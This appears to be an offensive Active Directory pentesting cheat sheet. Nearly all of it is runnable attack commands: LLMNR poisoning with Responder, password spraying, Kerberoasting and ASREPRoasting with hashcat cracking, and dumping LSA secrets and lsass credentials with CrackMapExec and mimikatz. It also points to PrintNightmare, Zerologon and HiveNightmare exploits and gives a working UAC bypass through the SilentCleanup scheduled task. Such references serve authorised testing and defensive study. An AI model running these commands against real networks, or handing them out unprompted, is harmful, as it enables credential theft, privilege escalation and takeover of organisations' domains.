# Enumeration

- Enumerate hosts
```
cme smb 192.168.1.0/24
```
- Locate Domain Controller
```
nmap -p 389 -T4 -A -v --script ldap-rootdse 10.10.10.10/10

or:

cmd.exe
nslookup
set type=all
_ldap._tcp.dc._msdcs.<DOMAIN> 
```
- Enumerate ports
```
nmap -p- 10.10.10.10/24
```

## General Checks
- Can you access sites such as exploit-db while connected to the network/domain?


# Foothold
## Foothold Attacks
### No creds needed
- LLMNR/NBT-NS poisoning to grab hashes
```
sudo python3 responder.py -I eth0 -wF -v
```
- try adding `--lm` as well to see if you can downgrade and do a PTH attack
- Password spray with `Password1`
- Check SMB shares:
	- `smbmap -H 192.168.1.40`
- Check SMB anonymous logon:
```
cme smb 10.10.10.178 -u 'a' -p ''
```
- Check SMB vulns:
	- `nmap --script smb-vuln* 192.168.1.16`

### Creds needed
- Kerberoast with CME
```
cme ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
hashcat -m13100 output.txt wordlist.txt
```
- ASREPRoast with CME
```
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
cme ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt

To specify DC IP:
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost ip_dc

Cracking:
hashcat -m18200 output.txt wordlist
```

## Username Enumeration 
### No creds needed
- Check breaches DB
- TheHarvester (requires parsing but is worth it)
`theHarvester -b all -d example.com`
- Hunter.io to grab email format. Often matches the AD account format but can double check in pentests by looking at privileged account given.
	- https://hunter.io/
- Null sessions to grab usernames
```
cme smb 10.10.10.10 -u '' -p '' --users
cme smb 10.10.10.10 -u '' -p '' --shares
cme smb 10.10.10.10 -u '' -p '' --logged-users / --loggedon-users
```
- Nmap with just IP and domain name
```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>`
```
- Nmap with IP and username list to validate
```
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
```
- Using MSF
```
msf> use auxiliary/gather/kerberos_enumusers
```
- Null sessions
```
crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq

enum4linux -U 10.10.10.161 | grep 'user:' | sed 's/user:\[//g' | sed 's/\]//g' | awk '{print $1}'
```

### creds needed
- User enumeration on SMB:	
```
use auxiliary/scanner/smb/smb_lookupsid
set rhosts 192.168.1.17
set smbuser raj
set smbpass 123
exploit
```
- using impacket and creds
```
GetADUsers.py -all -dc-ip 10.10.10.10 domain.com/username
```
- from RCE or local shell
```
net user /domain
Get-DomainUser
wmic useraccount get name,sid
```
- ASREPRoast


# Windows post-exploitation
## Intended functionality exploitation
- Grab LSA secrets with CME
```
Requires Domain Admin or Local Admin Priviledges on target Domain Controller:
cme smb 192.168.1.0/24 -u '' -p '' --lsa
cme smb 192.168.255.131 -u administrator -p pass -M lsassy
```
- Check for WinrRM so you can do PSRemoting or Evil-Winrm with low priv users
```
nmap -p 5985,5986 -sV 10.10.10.0/24
cme winrm -u username -p password 10.10.10.0/24 -x whoami
```
- Run Bloodhound remotely:
```
runas /netonly /user:DOMAIN\username powershell
# Enter password when prompted, then:

cd C:/Pentest/Tools/
Powershell -exec bypass
Import-module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -domain <DOMAIN> -DomainController 10.10.10.10
```
- Run mimikatz from CrackMapExec
```
cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
cme smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"sekurlsa::logonpasswords"
```
- Do the credential shuffle.
	- dump lsass of other boxes with the creds you already obtained until you find admins/DAs
	- loot manually to find creds in common places like config files, unattend, etc...
- Check user descriptions for passwords:
```
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description.length -gt 8 }
```
- Dump all usernames in domain to password spray again:
```
Get-ADuser -filter * -Properties SamAccountName | Select-Object SamAccountName
```
- kerberoast/ASREPRoast and crack offline
	- Check previous section for commands

## Exploits
- Check if if print spooler service is running
```
	Get-Service -Name spooler
```
- if print spooler service is running then try:
	- printNightmare 1-4
	- https://github.com/cube0x0/CVE-2021-1675/
	- https://github.com/calebstewart/CVE-2021-1675
```
1) Set SMB config in /etc/samba/smb.conf copying from Cune0x0 repo
# Check that both services are running on Kali to get samba share working
systemctl status smbd
systemctl status nmbd
```
Start service if not started

- Check Zerologon
	- https://github.com/SecuraBV/CVE-2020-1472
- Check hiveNightmare:
```
icacls c:\windows\system32\config\sam
```
If `BUILTIN\Users:(I)(RX)` then it's vulnerable
	- Exploitation: https://github.com/GossiTheDog/HiveNightmare
- PetitPotam
	- Requires local admin
	- Requires knowledge of DC IP
	- https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/
- SystemNightmare
	- https://github.com/GossiTheDog/SystemNightmare
	- run the two commands on the .bat file - gives you a SYSTEM cmd prompt
- [ ] Mimikatz
	- sekurlsa dump
- [ ] winPEAS
- [ ] SeatBelt
- [ ] Watson
- [ ] PowerUp
- [ ] Rubeus
- Bypass UAC
```
$registryPath = "HKCU:\\Environment"
$Name = "windir"
$Value = "powershell -ExecutionPolicy bypass -windowstyle hidden -Command `"& `'$PSCommandPath`'`";#"
Set-ItemProperty -Path $registryPath -Name $name -Value $Value
#Depending on the performance of the machine, some sleep time may be required before or after schtasks
Start-Sleep -Milliseconds #{datastore['SLEEPTIME']}
schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I | Out-Null
Remove-ItemProperty -Path $registryPath -Name $name
```